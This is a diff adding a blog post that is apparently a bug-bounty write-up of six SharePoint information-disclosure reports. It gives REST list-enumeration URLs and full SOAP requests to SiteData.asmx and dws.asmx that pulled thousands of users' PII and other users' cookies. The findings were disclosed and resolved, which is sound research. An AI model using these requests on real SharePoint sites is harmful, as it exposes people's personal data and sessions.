@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    Hunting on Microsoft SharePoint | The art of manipulation
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">Hunting on Microsoft SharePoint | The art of manipulation</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>4 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2024-04-12
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
+            Table of Contents
+            <br>
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#before-diving">Before Diving</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#what-is-microsoft-sharepoint">What is Microsoft SharePoint?</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-1">Report-1</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-2">Report-2</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#exploiting-the-p-id-parameter">Exploiting the p_ID Parameter</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-3">Report-3</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-4">Report-4</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#server-response">Server Response:</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#exploiting-sitedata-asmx">Exploiting SiteData.asmx</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#request">Request</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-5">Report-5</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/hunting-on-microsoft-sharepoint-the-art-of-manipulation/#report-6">Report-6</a>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>I'll discuss how I discovered that all users' PII was leaked via the Microsoft SharePoint API.</p>
+<span id="continue-reading"></span><h2 id="before-diving">Before Diving</h2>
+<h3 id="what-is-microsoft-sharepoint">What is Microsoft SharePoint?</h3>
+<p>Microsoft SharePoint is an enterprise collaboration and document management platform developed by Microsoft. While it includes Content Management System (CMS) capabilities, it is primarily designed for secure document storage, workflow automation, intranet portals, and team collaboration within organizations. Unlike Joomla and WordPress, which focus mainly on website creation, SharePoint integrates deeply with Microsoft 365 and is widely used for business process automation, knowledge sharing, and enterprise-level content management.</p>
+<h2 id="report-1">Report-1</h2>
+<p>While browsing the site and proxying the traffic through Burp, I noticed an interesting endpoint:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">bim.redacted.com/_api/web/lists/GetByTitle(&#39;Images&#39;)/items
+</span></code></pre>
+<p>It was my first time dealing with Microsoft SharePoint, so I experimented by replacing <code>Images</code> with other words like <code>{passwords, keys, emails, users}</code>. When I entered <code>Users</code>... Bang!</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;hunting-on-microsoft-sharepoint-the-art-of-manipulation&#x2F;assets/images/main.webp" 
+      alt="main" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p><strong>Note:</strong> While writing this report, all six reports have been resolved, and they have since switched to WordPress. 😆</p>
+<p><strong>Report 1 (High Severity) → Accepted → Resolved</strong></p>
+<h2 id="report-2">Report-2</h2>
+<p>After submitting the first report, I decided to dig deeper and noticed some SharePoint filtering operators like <code>{ $select, $filter, $expand }</code> and <code>p_ID</code>. So, I experimented with <code>$select</code> and <code>p_ID</code>.</p>
+<h3 id="exploiting-the-p-id-parameter">Exploiting the <code>p_ID</code> Parameter</h3>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">bim.redacted.com/_api/web/lists/GetByTitle(&#39;Users&#39;)/items?$skiptoken=Paged=TRUE&amp;p_ID=&lt;ID&gt;&amp;$select=*
+</span></code></pre>
+<p>By manipulating the <code>p_ID</code> parameter, I was able to access all users' PII <strong>(5,320 users)</strong>. Additionally, I found that modifying these parameters allowed access to certain system-related data:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Items(ID)/FieldValuesForEdit
+</span><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Items(ID)/FieldValuesAsText
+</span><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Items(ID)/AttachmentFiles
+</span><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Items(ID)/Folder
+</span><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Items(ID)/RoleAssignments
+</span><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/Fields
+</span></code></pre>
+<p>Furthermore, the following URL:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">/_api/Web/Lists(guid&#39;f936a00b-7bea-4ef8-9105-a624755e3fc7&#39;)/ContentTypes
+</span></code></pre>
+<p>exposed sensitive user information across <strong>nine columns</strong>, including <strong>phone numbers, countries, cities, states,</strong> and more.</p>
+<p><strong>Report 2 (High Severity) → Accepted → Resolved</strong></p>
+<h2 id="report-3">Report-3</h2>
+<p>One month later, I discovered another website within the scope that also used Microsoft SharePoint. I applied the same techniques and successfully identified another vulnerability, leading to a new report submission.</p>
+<p><strong>Report 3 (High Severity) → Accepted → Resolved</strong></p>
+<h2 id="report-4">Report-4</h2>
+<p>After that, I continued digging deeper into the SharePoint architecture.</p>
+<p>I used tools like <a href="https://github.com/adityaks/sparty">Sparty</a> and <a href="https://github.com/MayankPandey01/Sparty-2.0">Sparty-2.0</a> to audit the system. While many endpoints returned a <code>403 Forbidden</code> status code, I found that <code>bim.redacted.com/_vti_bin/spdisco.aspx</code> was publicly exposed without authentication. This, in itself, is considered an <strong>Information Disclosure Vulnerability</strong> with <strong>high severity</strong>—though its classification depends on the triager's judgment. In my case, the severity was marked as <strong>high</strong>.</p>
+<h3 id="server-response">Server Response:</h3>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">HTTP/2 200 OK
+</span><span style="color:#abb2bf;">Cache-Control: private
+</span><span style="color:#abb2bf;">Content-Type: text/xml; charset=utf-8
+</span><span style="color:#abb2bf;">Server: Microsoft-IIS/10.0
+</span><span style="color:#abb2bf;">X-Sharepointhealthscore: 0
+</span><span style="color:#abb2bf;">X-Aspnet-Version: 4.0.30319
+</span><span style="color:#abb2bf;">Sprequestguid: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
+</span><span style="color:#abb2bf;">Request-Id: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
+</span><span style="color:#abb2bf;">X-Frame-Options: SAMEORIGIN
+</span><span style="color:#abb2bf;">Sprequestduration: 50
+</span><span style="color:#abb2bf;">Spiislatency: 0
+</span><span style="color:#abb2bf;">X-Powered-By: ASP.NET
+</span><span style="color:#abb2bf;">Microsoftsharepointteamservices: 16.0.0.4822
+</span><span style="color:#abb2bf;">X-Content-Type-Options: nosniff
+</span><span style="color:#abb2bf;">X-Ms-Invokeapp: 1; RequireReadOnly
+</span><span style="color:#abb2bf;">Date: Fri, 29 Mar 2024 06:05:10 GMT
+</span><span style="color:#abb2bf;">Content-Length: 6412
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">&lt;discovery xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot;&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/alerts.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/alerts.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/alerts.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/Authentication.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/Authentication.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/Authentication.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/copy.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/copy.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/copy.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/diagnostics.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/diagnostics.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/diagnostics.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/dspsts.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/dspsts.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/dspsts.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/dws.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/dws.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/dws.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/forms.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/forms.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/forms.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/imaging.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/imaging.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/imaging.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/lists.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/lists.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/lists.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/meetings.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/meetings.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/meetings.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/People.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/People.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/People.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/permissions.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/permissions.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/permissions.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/SiteData.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/SiteData.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/SiteData.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/sites.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/sites.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/sites.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/spsearch.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/spsearch.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/spsearch.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/UserGroup.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/UserGroup.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/UserGroup.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/versions.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/versions.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/versions.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/views.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/views.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/views.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/WebPartPages.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/WebPartPages.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/WebPartPages.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;contractRef  ref=&quot;https://bim.redacted.com/_vti_bin/webs.asmx?wsdl&quot; docRef=&quot;https://bim.redacted.com/_vti_bin/webs.asmx&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/scl/&quot; /&gt;
+</span><span style="color:#abb2bf;">  &lt;discoveryRef ref=&quot;https://bim.redacted.com/_vti_bin/webs.asmx?disco&quot; xmlns=&quot;http://schemas.xmlsoap.org/disco/&quot; /&gt;
+</span><span style="color:#abb2bf;">&lt;/discovery&gt;
+</span></code></pre>
+<p>The response exposed several <strong>sensitive service endpoints</strong>, including:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">/_vti_bin/alerts.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/Authentication.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/copy.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/diagnostics.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/dspsts.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/forms.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/imaging.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/lists.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/People.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/SiteData.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/sites.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/spsearch.asmx
+</span><span style="color:#abb2bf;">/_vti_bin/UserGroup.asmx
+</span></code></pre>
+<p>At first, accessing these endpoints resulted in a <strong>403 Forbidden</strong> response. However, I didn’t give up and created a new <strong>low-privilege account</strong>. To my surprise, I received a <strong>200 OK</strong> response on many endpoints, including:</p>
+<ul>
+<li><strong>SiteData</strong></li>
+<li><strong>Sites</strong></li>
+<li><strong>Lists</strong></li>
+</ul>
+<p>But some critical ones—like <strong>Authentication, dspsts, forms, and People</strong>—remained forbidden.</p>
+<h3 id="exploiting-sitedata-asmx">Exploiting SiteData.asmx</h3>
+<p>The following endpoint was accessible:<br />
+<code>URL: https://bim.redacted.com/_vti_bin/SiteData.asmx</code></p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;hunting-on-microsoft-sharepoint-the-art-of-manipulation&#x2F;assets/images/SiteData.webp" 
+      alt="Site Data" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>This endpoint exposed useful functionalities, but I focused on <strong>GetList</strong> and <strong>GetListItems</strong> to extract information about lists.</p>
+<p><img src="/GetListItems.webp" alt="GetListItems" /></p>
+<p>The <strong>SOAP request</strong> required <code>&lt;strListName&gt;</code> as a mandatory parameter, while <code>&lt;strQuery&gt;</code>, <code>&lt;strViewFields&gt;</code>, and <code>&lt;uRowLimit&gt;</code> were optional.</p>
+<h3 id="request">Request</h3>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /_vti_bin/SiteData.asmx HTTP/2
+</span><span style="color:#abb2bf;">Host: bim.redacted.com
+</span><span style="color:#abb2bf;">Content-Type: text/xml; charset=utf-8
+</span><span style="color:#abb2bf;">Content-Length: 463
+</span><span style="color:#abb2bf;">Cookie: Healthy
+</span><span style="color:#abb2bf;">Soapaction: &quot;http://schemas.microsoft.com/sharepoint/soap/GetListItems&quot;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+</span><span style="color:#abb2bf;">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+</span><span style="color:#abb2bf;">  &lt;soap:Body&gt;
+</span><span style="color:#abb2bf;">    &lt;GetListItems xmlns=&quot;http://schemas.microsoft.com/sharepoint/soap/&quot;&gt;
+</span><span style="color:#abb2bf;">      &lt;strListName&gt;f936a00b-7bea-4ef8-9105-a624755e3fc7&lt;/strListName&gt;
+</span><span style="color:#abb2bf;">      &lt;uRowLimit&gt;6000&lt;/uRowLimit&gt;
+</span><span style="color:#abb2bf;">    &lt;/GetListItems&gt;
+</span><span style="color:#abb2bf;">  &lt;/soap:Body&gt;
+</span><span style="color:#abb2bf;">&lt;/soap:Envelope&gt;
+</span></code></pre>
+<p>Initially, I received a <strong>403 Forbidden</strong> response because I wasn't authenticated. However, when I inserted a <strong>valid low-privilege cookie</strong>, I got a <strong>200 OK</strong> response with <strong>3,066 users' PII</strong>.</p>
+<p><strong>Report 4 (High Severity) → Accepted → Resolved</strong></p>
+<h2 id="report-5">Report-5</h2>
+<p>Then I accessed <code>bim.redacted.com/_vti_bin/dws.asmx</code>, and this turned out to be the most interesting part because I found all users' cookies in decrypted form (two of them belonged to triagers, along with many from other researchers ;D).</p>
+<p>Request:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /_vti_bin/dws.asmx HTTP/2
+</span><span style="color:#abb2bf;">Host: bim.redacted.com
+</span><span style="color:#abb2bf;">Content-Type: text/xml; charset=utf-8
+</span><span style="color:#abb2bf;">Content-Length: 384
+</span><span style="color:#abb2bf;">Cookie: Healthy
+</span><span style="color:#abb2bf;">Soapaction: &quot;http://schemas.microsoft.com/sharepoint/soap/dws/GetDwsData&quot;
+</span><span style="color:#abb2bf;">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+</span><span style="color:#abb2bf;">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+</span><span style="color:#abb2bf;">  &lt;soap:Body&gt;
+</span><span style="color:#abb2bf;">    &lt;GetDwsData xmlns=&quot;http://schemas.microsoft.com/sharepoint/soap/dws/&quot;&gt;
+</span><span style="color:#abb2bf;">      &lt;document&gt;&lt;/document&gt;
+</span><span style="color:#abb2bf;">    &lt;/GetDwsData&gt;
+</span><span style="color:#abb2bf;">  &lt;/soap:Body&gt;
+</span><span style="color:#abb2bf;">&lt;/soap:Envelope&gt;
+</span></code></pre>
+<p>I simply sent the request with an empty <code>&lt;document&gt;&lt;/document&gt;</code> element, which turned out to be the key.</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;hunting-on-microsoft-sharepoint-the-art-of-manipulation&#x2F;assets/images/Users.webp" 
+      alt="Users" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>The response also included other properties like <code>IsSiteAdmin</code>, <code>IsDomainGroup</code>, etc.</p>
+<p><code>Report 5 (High Severity, as it only affects confidentiality) -&gt; Accepted -&gt; Resolved</code></p>
+<h2 id="report-6">Report-6</h2>
+<p>In my final submission, I reported the exposed URL: <code>bim.redacted.com/_vti_bin/spdisco.aspx</code> as an Information Disclosure vulnerability.</p>
+<p><code>Report 6 (High Severity) -&gt; Accepted -&gt; Resolved</code></p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;hunting-on-microsoft-sharepoint-the-art-of-manipulation&#x2F;assets/images/Reports.webp" 
+      alt="Reports" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
